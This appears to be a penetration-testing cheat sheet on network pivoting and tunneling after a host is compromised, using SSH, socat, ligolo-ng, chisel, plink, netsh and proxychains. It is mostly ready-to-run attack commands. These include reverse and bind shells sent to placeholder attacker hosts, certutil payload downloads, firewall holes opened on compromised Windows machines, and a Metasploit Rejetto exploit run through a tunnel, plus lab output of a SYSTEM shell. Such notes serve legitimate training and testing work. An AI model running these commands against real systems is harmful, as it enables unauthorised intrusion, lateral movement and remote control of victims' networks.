# Port Redirection and Tunneling

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md" %}

```c
ip addr
ip route

# Host / Port Discovery (Linux)
for i in $(seq 1 254); do nc -zv -w 1 172.16.173.$i 445; done

arp -a
/etc/hosts
C:\Windows\System32\drivers\etc\hosts
/etc/resolv.conf
nmcli dev show

# Static binaries
https://github.com/andrew-d/static-binaries
https://github.com/ernw/static-toolbox/
```

Port redirection means modifying the flow of data so that packets sent to one socket will be taken and passed to another socket.

Tunneling means encapsulating one type of data stream within another, for example, transport HTTP traffic within a SSH connection (so from an external perspective, only the SSH traffic will be visible).

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/sshuttle/sshuttle
https://github.com/klsecservices/rpivot
https://github.com/jpillora/chisel
https://adepts.of0x.cc/shadowmove-hijack-socket/
# SSH Tunneling (if we make a sensitive connection to our attacker machine)
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser

# SSH Remote Port Forwarding
C:\pivot> ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:TARGET_PORT -N

# SSH Local Port Forwarding (making a local port from our attacking machine available to another host, for example to get a revshell where that host would not normally be able to connect to us)
C:\pivot> ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N # forward all connections to 80 pivot box to my localhost
# Since we are opening a new port on pivot box, we might need to add a firewall rule to allow for incoming connections
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80

# Remote Port Forwarding With socat
c:\pivot> socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 # listen 3389 on pivot and forward to host 1.1.1.1 on port 3389
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
# Local port forwarding (to reach attacker's port)
C:\pivot> socat TCP4-LISTEN:80,fork TCP4:$ATTACKER_IP:80

# Dynamic Port Forwarding and SOCKS
C:\pivot> ssh tunneluser@ATTACKER_IP -R 9050 -N
/etc/proxychains.conf
[ProxyList]
socks4  127.0.0.1 9050

# Tunnelling Complex Exploits (Rejetto)
ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
user@AttackBox$ msfconsole
msf6 > use rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878 
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```
{% endcode %}

## ligolo-ng

{% code overflow="wrap" fullWidth="true" %}
```bash
https://4pfsec.com/ligolo
https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740
https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5
https://github.com/nicocha30/ligolo-ng
Go to releases > Agent will be run on pivot machine, proxy on the attacking machine (use proper platform and arch)

# Setup Ligolo on Linux -> create tun interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Start proxy server (default port 11601):
./proxy -h # Help options
./proxy -selfcert # dynamically generate self-signed certificates

# Execute the agent (on compromised pivot Windows machine for example) 
C:\> agent.exe -connect $ATTACKER_IP:11601 -ignore-cert 
# We wait until on the C2 proxy part we see agent joined
ligolo-ng >> session # then 1
ligolo-ng >> ifconfig

# If that Windows machine has an internal network (10.10.120.0/24) that we want to access via pivoting
sudo ip route add 10.10.120.0/24 dev ligolo
# To confirm it 
ip route list
# List routes for an interface:
ip route show dev eth0
ip route show dev >interface<
# Now on the proxy server 
ligolo-ng >> session # select 1 or whatever session is and then start to set up the tunnel
[Agent : WIN-...\user@Win-client-01] >> start
# Check it is really working
cme smb 10.10.120.0/24

# Access to agent's/target's local ports (127.0.0.1)
https://github.com/nicocha30/ligolo-ng/wiki/Localhost

# Catch a revshell from a host on the internal network (C) -> we need to add a listener
[Agent: ...] >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
[Agent: ...] >> listener_list
# Any connection that comes into pivot machine on 1234 (B) is gonna be redirected to our attacking machine (A) on port 4444
# Start listener on localhost (attacking machine) 
rlwrap nc -lvnp 4444
# Now we need RCE or any flaw or get access to spawn a revshell using the internal IP of the pivot machine B (check interface with ipconfig /all)
C:\Users\Internal-Network-C> nc.exe 10.10.120.131 1234 -e cmd

# Transfer files -> add a dedicated listener for fileserver and specify internal IP of pivot machine (B) when downloading files
[Agent: ...] >> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
[Agent: ...] >> listener_list
C:\Users\Internal-Network-C> certutil -urlcache -split -f http://10.10.120.131:1235/winpeas64.exe winpeas.exe


# DOUBLE-TRIPLE PIVOT
# This may overcomplicate the steps but in case we want to access an internal network that does not appear as network interface
# Once we got ligolo interface with a tunnel, create another interface with another tunnel
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.2.0/24 dev ligolo2
# ONLY in case X.X.X.0/24 fails and it's just one machine we want to access -> route that host exclusively
sudo ip route add 172.16.2.6 dev ligolo2 
# Catch a session 
[Agent : AGENT] » session
# Note that sudo ip route add has to be the one we get from ifconfig on the session agent
[Agent : AGENT] » start
# If it fails, indicate the new interface to route
[Agent : AGENT] » start --tun ligolo2
# ALTERNATIVE: try autoroute and select 172.16.2.0/24 option or the only one available
[Agent : AGENT] » autoroute


# Delete the tun interface when you are done:
sudo ip route del 10.10.120.0/24 dev tap0
sudo ip tuntap del dev ligolo mode tun
```
{% endcode %}

## Port forwarding

[https://erev0s.com/blog/ssh-local-remote-and-dynamic-port-forwarding-explain-it-i-am-five/#dynamic-port-forwarding](https://erev0s.com/blog/ssh-local-remote-and-dynamic-port-forwarding-explain-it-i-am-five/#dynamic-port-forwarding)

When you want to expose a service in a server to a port of an interface reachable to you, use **Local port Forwarding**.\
When you want to expose a service running in your machine to a port of an interface reachable to a remote server, use **Remote port Forwarding**.

## nmap

{% code overflow="wrap" %}
```bash
# nmap -sn -n [subnet] - scan an internal subnet once the pivot machine was compromised
nmap -sS -Pn -n -p- 172.16.80.100
nmap --top-ports=20 -sT -Pn $INTERNAL_IP_TARGET
```
{% endcode %}

## arp-scan (Windows)

Before pivoting a compromised system you will need to do host discovery on the same LAN. Instead of using nmap through proxychains, which can take a very long time I would instead drop [arp-scan](https://github.com/QbsuranAlang/arp-scan-windows-) on the Windows system, which returns results in a few minutes at most.

```
https://github.com/QbsuranAlang/arp-scan-windows-
C:\Lab19>arp-scan.exe -t 10.100.11.0/24
arp-scan.exe -t 10.100.11.0/24
Reply that 00:50:56:BA:70:F9 is 10.100.11.1 in 175.483073
Reply that 00:50:56:BA:57:08 is 10.100.11.100 in 29.825739
Reply that 00:50:56:BA:5A:C1 is 10.100.11.101 in 0.078994
Reply that 00:50:56:BA:5A:C1 is 10.100.11.255 in 0.077532
```

Once you have identified hosts you want to explore further, you’ll need to run a port scan, on all 65,535. Again nmap through proxychains is really slow here, ETA >3hrs. Thankfully there’s an alternative. We can drop `nmap.exe` compiled as a standalone binary and run it. You can’t do anything more than a port scan though, not even a service scan since it’s not installed properly with all its dependencies. You can [download nmap.exe here](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86).

```bash
https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86
C:\Lab19>nmap.exe -Pn -n -sS -p- 10.100.11.100
nmap.exe -Pn -n -sS -p- 10.100.11.100
```

## SSH (Linux/Windows)

{% tabs %}
{% tab title="Overview" %}
{% code overflow="wrap" %}
```bash
https://www.ssh.com/ssh/protocol/
https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
We will use a tool called ss to investigate sockets running on a host. If we run ss -tulpn it will tell us what socket connections are running

We can see (for instance) that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!From our local machine, run 
Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.
```
{% endcode %}
{% endtab %}

{% tab title="Check open port" %}
```bash
ss -tulpn # -t TCP -u UDP -l listening 
          # -p process using the socket -n don't resolve DNS
```
{% endtab %}

{% tab title="Local" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># A -> B -> C -> D  /// A attacking machine B compromised machine C machine we have access from B (e.g. via SSH) D internal subnet we target to reach
# Local (either issued on attacking machine or intermediate machine to reach an internal subnet) // use -v for debug output
ssh (-f) -N -L 0.0.0.0:4444:$TARGET_IP:TARGET_PORT user@IP # user@IP are the pair of the attacking machine or intermediate machine, 
# A -> B -> C -> D /// if A is our attacking machine and D the target, if we execute this command on B to reach D then user@IP would be C and command is executed on compromised B machine
# Now from attacking machine, connecting to port 4444 of B machine is like connecting to TARGET_PORT OF D (TARGET_IP)
# TARGET_IP:TARGET_PORT is what can you reach from C (user@IP)



# Local Port Forwarding -> get access to internal ports/networks, usually command is issued on the attacking machine
ssh -f -N -L LOCAL_PORT:localhost:TARGET_PORT VICTIM_USER@VICTIM_IP # on attacking machine - localhost if the internal port on the target is accesible as localhost/127.0.0.1
<strong>
</strong># On a SSH prompt (victim) we can issue ~C and get ssh>
user@victim:/home$ ~C
ssh> -L 8000:127.0.0.1:80 # this forwards everything we send to our 8000 localhost to the localhost victim on port 80
<strong>
</strong>kali@kali sudo ssh -f -N -L 0.0.0.0:10000:$IP:10000 &#x3C;username>@&#x3C;ip> (USER-IP OF VICTIM)
# if we do not know creds, we can generate SSH keys and use
ssh-i identity file -L 8000:localhost:8000 USER@TARGET_IP # identity file = private key
</code></pre>
{% endtab %}

{% tab title="Remote" %}
{% code overflow="wrap" %}
```bash
# can be used to connect back to an attacker-controlled SSH server, and bind the listening port there. We can think of it like a reverse shell, but port forwarding.
# Remote (useful if there is a FW on the target and inbound rules are strong) (SSH server on our attacking machine, and we connect from the B compromised machine to our Kali overf SSH)
kali@kali sudo sytemctl start ssh # We start SSH server on our attacking machine / BEFORE STARTING SSH SERVER, SET A STRONG PASSWORD FOR KALI USER!!!!
sudo ss -tulpn # check SSH port is open and listening on all interfaces 0.0.0.0:22
# In order to connect back to Kali SSH server, password-based auth must be allowed by setting PasswordAuthentication to yes in /etc/ssh/sshd_config
compromised@machine ssh (-f) -N -R 127.0.0.1:4444:10.10.20.25:80 kali@192.168.100.15 # listen on port 4444 of Kali (127.0.0.1:4444) and forward all traffict to HTTP port of the target C (10.10.20.25:80)
# Check the remote port forward is listening
ss -ntplu | grep 4444
# Now connect to the target on 127.0.0.1 port 4444 via the appropiate tool regarding the service there (browser, SMB, MySQL, psql...)




# Remote Port Forwarding
The remote port forwarding feature in SSH can be thought of as the reverse of local port forwarding, in that a port is opened on the remote side of the connection and traffic sent to that port is forwarded to a port on our local machine (the machine initiating the SSH client).
Remote -> in case inbound traffic on the target is not allowed // like reverse the local (like local but done on the target)
"user@victim" ssh -f -N -R $KALI_IP:2221:127.0.0.1:3306 kali@10.11.0.4 # important this order
# This will forward all incoming traffic on our Kali system's local port 2221 to port 3306 on the compromised box
Another way to do this remote is do it on our Kali using the victim SSH connection
"kali@kali" ssh -R PORT:DESTIP:DESTPORT user@victim
# Check port is open correctly
ss -antp | grep "2221"
kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221

# To enable SSH (internal port) for us on port 4646 for example
target@machine ssh -R 4646:$IP:22 <username>@<ip> (USER-IP OF KALI MACHINE)
# It's possible to use -R twice for two different ports
```
{% endcode %}
{% endtab %}

{% tab title="Dynamic" %}
{% code overflow="wrap" %}
```bash
# Dynamic (access any port of any host that the user@IP has access through the single listening port) (uses SOCKS as proxying protocol)
# From our pivot compromised machine (B), we use SSH creds from C to create the port forwarding to access the internal subnet D
(from B) ssh -N -D 0.0.0.0:9999 user@C_TARGET_IP # listen on all interfaces on port 9999, does not need socket address to forward to (TARGET_IP:TARGET_PORT)
# Proxychains (will not work on statically-linked binaries)
# Edit /etc/proxychains4.conf and replace whatever is there to have a single line
# Then from our attacking machine we can access subnet D using socks and proxychain (socks5 B_PIVOT_IP 9999)
socks5 $PROXY_IP $LISTENING_PORT # PROXY_IP is the IP of the B machine or where the ssh dynamic command was run in case there is A -> B -> C -> D
proxychains smbclient -L //172.16.16.16/ -U $user --password=$PASS # IP is the internal IP we want to access as he have a direct connection to it
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.16.16



# Check version, if it is relatively recent it has dynamic pfwd
ssh -V
# reverse dynamic port forwarding to Kali with SOCKS proxy
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@192.168.0.2
# -i is the private key path which can be wherever we want such as /tmp/keys
#Dynamic port forwarding executed on Kali in case we have SSH access to the target
ssh root@10.11.1.0 -D 127.0.0.1:1080 -N
# Edit last line etc/proxychains.conf to configure
socks4  127.0.0.1 1080
# To speed up scans through proxychains, modify timeout via the tcp_read_time_out and tcp_connect_time_out values in /etc/proxychains.conf. However, don't set these too low or you will receive incorrect results.

# Dynamic Port Forwarding (we need access to an internal network and target any host and port there to do nmap scan)
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
# Create local SOCKS4 application proxy on our Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to any host in the target network, through the compromised Linux machine, which we log into as pepe:
sudo ssh -N -D 127.0.0.1:8080 pepe@10.11.0.128
# cat /etc/proxychains.conf
socks4 127.0.0.1 8080
# To run our tools through our SOCKS4 proxy, we prepend proxychains. SOCKS proxies require a TCP connection to be made and thus a half-open for SYN scan cannot be used with ProxyChains
sudo proxychains nmap --top-ports=20 -sT -Pn $INTERNAL_IP_TARGET
# We have to use the -sT parameter. If not, Nmap will stick to using the SYN technique which would negate Proxychains. This happens because Nmap through a proxy has limited options, i.e. simple TCP connections (no ICMP ping, no UDP scans, no SYN stealth scan, no OS detection, etc.).
```
{% endcode %}
{% endtab %}

{% tab title="Remote Dynamic" %}
{% code overflow="wrap" %}
```sh
# Remote dynamic (connection from the compromised machine to the attacking machine and also allows more flexibility to connect to other ports and hosts)
# NOTE: OpenSSH client needs to be version 7.6 or higher in order to use it 
compromised@machine ssh (-f) -N -R 9999 kali@192.168.100.15
# Check the remote dynamic port forward is listening
ss -ntplu | grep 9999
# Modify /etc/proxychains4.conf
socks5 127.0.0.1 9999
# Now we can target and scan other hosts and ports from the compromised machine perspective
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.8.8.25


############### WINDOWS ssh.exe (SSH client available since version 1803) (scp.exe, sftp.exe, ssh.exe, other ssh-* in %systemdrive%\Windows\System32\OpenSSH)
# Remote dynamic pfwd (command run on Windows compromised host to make it possible to discover other hosts and ports from Kali attacking machine)
kali@kali sudo systemctl start ssh
# Check where is the ssh.exe on the Windows compromised host
C:\> where ssh
C:\> ssh.exe -V # if higher than 7.6, we can use remote dynamic port forwarding
C:\> ssh -N -R 9999 kali@$KALI_IP
# Check port is open on Kali successfully
kali@kali ss -ntplu | grep 9999
# Update /etc/proxychains4.conf
socks5 127.0.0.1 9999
# Now from Kali we can connect to any host:port reachable by the compromised Windows machine 
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Socat

{% tabs %}
{% tab title="Overview" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Connection
socat - TCP4:$IP:80
# Listener
socat TCP4-LISTEN:443 STDOUT
<strong>
</strong><strong># Listener
</strong>socat TCP-L:&#x3C;port> -
# On Windows to connect back
socat TCP:&#x3C;LOCAL-IP>:&#x3C;LOCAL-PORT> EXEC:powershell.exe,pipes
# On Linux
socat TCP:&#x3C;LOCAL-IP>:&#x3C;LOCAL-PORT> EXEC:"bash -li"

# Full TTY shell (Linux)
socat TCP-L:&#x3C;port> FILE:`tty`,raw,echo=0 
socat TCP:&#x3C;attacker-ip>:&#x3C;attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# If we need a revshell from internal network to be caught on our attacking machine, run this on pivot machine (already compromised)
socat TCP-LISTEN:4646,fork TCP:$ATTACKING_IP:PORT
# On our attacking machine
nc -lvnp 4646
# If there are 5 different interfaces and internal networks for example, we have to use socat on every machine until reach the pivot machine
# and then forward traffic to our attacking machine
# Another alternative is to set up a Netcat listener on the internal target and catch the revshell there

# If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

# IF SOCAT IS ON THE TARGET MACHINE
# Local port forwarding, internal port 8080 would be exposed as port 5689 from the host/attacking machine perspective
socat TCP-LISTEN:5689,fork,reuseaddr tcp:127.0.0.1:8080 &#x26;

# TCP-LISTEN:(PORT WE WILL USE WITH THE TARGET MACHINE IP), e.g. 10.0.2.17:5689
# tcp:(INTERNAL ACTIVE IP AND PORT OF THE TARGET MACHINE)
</code></pre>
{% endtab %}

{% tab title="Bind shells" %}
```bash
# On a Linux target we would use the following command:
socat TCP-L:<PORT> EXEC:"bash -li"
# On a Windows target we would use this command for our listener:
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
# this command on our attacking machine to connect to the waiting listener.
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
{% endtab %}

{% tab title="Reverse shell relay" %}
{% code overflow="wrap" %}
```bash
socat -d -d TCP4-LISTEN:443 STDOUT #listener
socat TCP4:10.11.0.22:443 EXEC:/bin/bash

# Reverse shell relay (create a relay to send a revshell back to our attacking m)
sudo nc -lvnp 443
./socat tcp-l:8000 tcp:ATTACKING_IP:443 & #Try to use same port (2000 and 2000)
```
{% endcode %}
{% endtab %}

{% tab title="Port forwarding" %}
{% code overflow="wrap" %}
```bash
# Port forwarding with socat (not necessary if the intermediate machine has the tool to connect to the subnet, if socat is not on the machine transfer a statically-linked binary)
socat -ddd TCP-LISTEN:2222,fork TCP:$TARGET_IP:$TARGET_PORT # run on the intermediate machine to listen on 3456 and forward traffic to the target IP and port
# iptables
Only with root privs, need some specific rules and requires enabling forwarding -> echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding


# -- Quiet -- Do not open any ports on the target machine
# Attacking machine This opens up 8000 and 8001, creating a local port relay. 
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
# Next, on the compromised relay server 
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
# Close the background jobs
jobs
kill %NUMBER
```
{% endcode %}
{% endtab %}

{% tab title="Encrypted shells" %}
{% code overflow="wrap" %}
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt # create self-signed cert
cat bind_shell.key bind_shell.crt > bind_shell.pem # convert them to a format socan can accept
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash # listener
socat - OPENSSL:10.11.0.4:443,verify=0

# Certificate generation on the attacker machine
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
# Then fill info in blank. 
# After that, We need to merge the two created files into a single .pem file:
cat shell.key shell.crt > shell.pem
# Now, when we set up our reverse shell listener, we use:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# To connect back, we would use:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
# The same technique would apply for a bind shell:
# Target:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
# Attacker:
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
# Example with tty shell port 53 listener
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0,FILE:`tty`,raw,echo=0
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Revsocks

Reverse tunnel + SOCKS 5 proxy on Firefox using Foxy Proxy

{% code overflow="wrap" %}
```bash
# Download the release for both OS attacking and victim
https://github.com/kost/revsocks/releases/tag/v1.1.0

# Listen on the server and create a SOCKS 5 proxy on port 1080
user@VPS$ ./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234

# Connect client to the server
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234

#Configure SOCKS 5 proxy on Firefox using Foxy Proxy
https://support.ipvanish.com/hc/en-us/articles/360001410573-How-to-Configure-the-SOCKS5-Proxy-in-Firefox-
```
{% endcode %}

## Proxychains

```bash
cat /etc/proxychains.conf

#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5	127.0.0.1 1080		password

# THEN
proxychains (nmap for example) $IP

# We will conduct a connect scan with the -sT flag. 
# SOCKS proxies require a TCP connection to be made and thus a half-open or 
# SYN scan cannot be used with ProxyChains. Since SOCKS proxies require 
# a TCP connection, ICMP cannot get through either and we must disable pinging
# with the - Pn flag.
proxychains nmap --top-ports=20 -sT -Pn $INTERNAL_IP

# Proxychains double pivoting 
https://theyhack.me/Proxychains-Double-Pivoting/
https://ryanwendel.medium.com/forwarding-reverse-shells-through-a-jump-box-using-ssh-7111f1d55e3a
```

## Plink (Windows)

{% code overflow="wrap" %}
```bash
# Remote pfwd
C:\> plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:8788:127.0.0.1:3389 $KALI_IP # 8788 listening port, 3389 is the target port of the compromised machine which runs this command
# If Windows shell is very limited for plink usage, try this
cmd.exe /c echo y | plink.exe -ssh ...
# Now we have access to RDP port 3389 from Kali
kali@kali xfreerdp /u:$USER /p:$PASS /v:127.0.0.1:8788



# - Change root password --> passwd root --> type hola for example
service ssh start
# - Enable root login --> nano /etc/ssh/sshd_config --> PermitRootLogin yes
service ssh restart
# - Transfer first plink to the Windows machine
netstat -anpb TCP #check internal TCP ports
# remote port forward (-R) of port 1234 (10.11.0.4:1234) to the MySQL port on the Windows target (127.0.0.1:3306) 
cmd.exe /c echo y | plink.exe -ssh -l kali -pw hola123 -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
# - UNDO PermitRootLogin

# ETERNAL BLUE (OPEN INTERNAL PORT WITH PLINK)
After using plink and get the port 445 open, we can use AutoBlue > checker to check if the target is vulnerable
python eternalblue_checker.py 127.0.0.1
Finally, zzz_exploit


# It can turn a port say TCP 445 on a compromised Windows machine to one on your Kali machine. So if  you somehow have SMB login admin creds but unable to connect to 445 on  the Windows machine because a firewall is blocking 445 from external  IPs, you can forward that port to your own local machine.
C:\>plink.exe -l root -pw myKaliPW $KALI_IP -R 445:127.0.0.1:445
#It doesn’t have to be 445, but smbexec.py doesn’t allow other ports than 139, 445. Once plink is running that shell becomes uselss; open up another shell beforehand. Run an nmap scan to check if the forwarding is successful.
nmap -Pn -n -sV -p 445 --script=smb-os-discovery 127.0.0.1
# Now you can run smbexec, psexec or wmiexec.py.

# REVERSE PORT FORWARDING WITH OUR KEYS ON WINDOWS
sudo apt install putty-tools
ssh-keygen
puttygen KEYFILE -o OUTPUT_KEY.ppk
# The resulting .ppk file can then be transferred to the Windows target and used
```
{% endcode %}

## Netsh (Windows)

{% code overflow="wrap" %}
```bash
# netsh (needs admin rights on Windows so we might need UAC bypass to use it)
# Port forwarding (listenaddress is compromised IP, connect address is the internal target we want to access from the Windows_compromised_machine)
C:\>netsh interface portproxy add v4tov4 listenport=4444 listenaddress=192.168.8.22 connectport=22 connectaddress=10.2.30.120
# Check it was correctly created
C:\> netstat -anp TCP | find "4444"
C:\> netsh interface portproxy show all
kali@kali:~$ sudo nmap -sS 192.168.8.22 -Pn -n -p2222
# If the result is a filtered port, FW is acting so we need a hole there (allow inbound connection to that listening port)
C:\> netsh advfirewall firewall add rule name="pfwd_ssh_4444" protocol=TCP dir=in localip=192.168.8.22 localport=4444 action=allow
# Port should be open now from the outside and we could use SSH
kali@kali:~$ ssh user@192.168.8.22 -p 4444
# WHEN FINISHED, DO NOT FORGET TO REMOVE THE HOLE (FW RULE)
C:\> netsh advfirewall firewall delete rule name="pfwd_ssh_4444"
# We could also remove the port fwd
C:\> netsh interface portproxy del v4tov4 listenport=4444 listenaddress=192.168.8.22




# OPEN A PORT ON THE WINDOWS FIREWALL TO ALLOW A FORWARD CONNECTION
netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT

# REQUIREMENTS:
# - SYSTEM
# - IP HELPER SERVICE RUNNING
# - IPV6 SUPPORT ENABLED

# LISTENING (WINDOWS MACHINE COMPROMISED), CONNECT (MACHINE ON SUBNET TO BE REACHED)
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110

netstat -anp TCP | find "4455"

# ADD A FIREWALL RULE TO ALLOW INBOUND CONNECTIONS
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
```
{% endcode %}

In SSF, to pivot you will need to relay incoming traffic from a target host hitting on say port 3333 of the compromised host (the pivot host) to port 3333 on Kali, configured like this

```bash
https://github.com/securesocketfunneling/ssf/releases/tag/3.0.0
C:\>ssf.exe -g -F 22222 -L [pivot-host]:3333:[Kali-IP]:3333 -p 11111 [Kali-IP]
```

Port 11111 is what our ssfd server on Kali is listening for, so this client can connect back, and 22222 is what proxychains is configured to work through. There is a way to do this in Windows 7 and later using `netsh` portproxy. The equivalent with `netsh` would be

{% code overflow="wrap" %}
```csharp
C:\WINDOWS\system32>netsh interface portproxy add v4tov4 listenport=3333 listenaddress=10.100.11.101 connectport=3333 connectaddress=175.12.80.10

C:\WINDOWS\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.100.11.101   3333        175.12.80.10    3333
```
{% endcode %}

Just to explain&#x20;

• 10.100.11.101 is our pivot Windows host&#x20;

• 175.12.80.10 is Kali. Our Windows host must be able to ping 175.12.80.10 Once set up, set up the listener on Kali port 3333 then trigger the reverse shell on the target host.

```bash
root@Kali:~/PTP/3.3_Offensive_Powershell/Lab 19# nc -nlvp 3333
listening on [any] 3333 ...
connect to [175.12.80.10] from (UNKNOWN) [172.16.80.100] 62636
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 7.0>whoami 
whoami
nt authority\system
```

This is actually a shell on 10.100.11.100. I forgot to show `ipconfig`. To delete the portproxy rule just do this

{% code overflow="wrap" %}
```c
C:\WINDOWS\system32>netsh interface portproxy delete v4tov4 listenport=3333 listenaddress=10.100.11.101

C:\WINDOWS\system32>netsh interface portproxy show all
```
{% endcode %}

Once deleted, `show all` will return zero results.

## Chisel (Windows/Linux)

{% hint style="info" %}
If it fails, also try an older release version
{% endhint %}

<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#
https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/
<strong>
</strong><strong># Download the binaries here:
</strong>https://github.com/jpillora/chisel/releases

#If we execute it on Windows, transfer it and the name to chisel.exe

# REVERSE SOCKS PROXY
./chisel server -p LISTEN_PORT (--socks5) --reverse &#x26; #attacking box
./chisel client (--max-retry-count 1) ATTACKING_IP:LISTEN_PORT R:socks &#x26; #victim
# With root privileges edit the file /etc/proxychains4.conf. At the bottom you should add the following line:
socks5 127.0.0.1 1080
# (1080 is the default port of the chisel reverse proxy) 
# If there is a line with port 9050 above it, comment it out. That's Tor port

# You can now attack a third server connected to our compromised target but not visible from the outside (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers wont need verbose proxy traffic.
proxychains -q nmap -sC -sV 10.0.60.99
proxychains -q ssh user@10.0.60.99
proxychains -q mysql -u dbuser -h 10.0.60.99
# Drawbacks
#    NMAP scans are much slower than usual.
#    UDP stuff probably doesn’t work. Microsoft RDP for example can behave funky.
#    With UDP not really working, DNS doesn’t work most of the time. Add the stuff you need to /etc/hosts.

# CREATE A PROXY WITH SSH
# If the pivot machine (compromised machine with access to another machine not accessible externally) runs SSH you can simply run one command to establish a reverse proxy. On your attacking machine run:
ssh user@pivotmachine -R1080:localhost #    R1080:local = tells SSH to setup a SOCKS5 proxy on localhost:1080
